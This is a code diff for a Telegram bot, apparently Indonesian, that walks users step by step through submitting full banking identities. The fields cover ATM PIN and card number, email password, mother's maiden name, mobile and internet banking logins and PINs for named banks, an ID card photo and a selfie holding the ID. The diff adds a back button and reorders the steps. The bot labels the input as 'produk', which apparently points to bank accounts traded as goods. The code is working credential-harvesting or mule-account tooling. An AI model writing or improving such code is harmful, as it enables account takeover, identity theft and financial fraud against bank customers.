@@ -11,8 +11,9 @@ const bot = new TelegramBot(token);
 const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';
 
 const getSteps = (bank) => {
-  const commonSteps = [
-    'customer', 'bank', 'grade', 'kcp', 'nik', 'nama',
+  const commonStart = ['customer', 'bank'];
+  const commonEnd = [
+    'grade', 'kcp', 'nik', 'nama',
     'namaIbuKandung', 'tempatTanggalLahir', 'noRek', 'noAtm',
     'validThru', 'noHp', 'pinAtm', 'email', 'passEmail', 'expired'
   ];
@@ -25,12 +26,12 @@ const getSteps = (bank) => {
     bankSteps = ['brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword', 'jenisRekening'];
   } else if (b === 'BNI') {
     bankSteps = ['pinWondr', 'passWondr'];
-  } else {
+  } else if (bank) {
     // Other bank: common mobile/ib fields
     bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
   }
 
-  return [...commonSteps, ...bankSteps, 'uploadFotoId', 'uploadFotoSelfie'];
+  return [...commonStart, ...bankSteps, ...commonEnd, 'uploadFotoId', 'uploadFotoSelfie'];
 };
 
 const setWebhook = async (req, res) => {
@@ -101,7 +102,20 @@ const askNextField = async (chatId, session) => {
     uploadFotoId: '📸 Silakan kirim FOTO KTP Anda:',
     uploadFotoSelfie: '📸 Terakhir, silakan kirim FOTO SELFIE dengan KTP:'
   };
-  await bot.sendMessage(chatId, labels[field]);
+  const opts = {
+    reply_markup: {
+      inline_keyboard: []
+    }
+  };
+
+  // Add Back button if not first step
+  if (currentIndex > 0) {
+    opts.reply_markup.inline_keyboard.push([
+      { text: '⬅️ Kembali', callback_data: 'prev_step' }
+    ]);
+  }
+
+  await bot.sendMessage(chatId, labels[field], opts);
 };
 
 const submitForm = async (chatId, session) => {
@@ -196,6 +210,14 @@ const handleWebhook = async (req, res) => {
         await session.save();
         await bot.sendMessage(chatId, 'Mulai input produk via chat. Jawab pertanyaan berikut.');
         await askNextField(chatId, session);
+      } else if (data === 'prev_step') {
+        if (session.sessionStep > 0) {
+          session.sessionStep -= 1;
+          await session.save();
+          await askNextField(chatId, session);
+        } else {
+          await bot.sendMessage(chatId, 'Ini adalah pertanyaan pertama.');
+        }
       }
 
       return res.status(200).send('Callback processed');
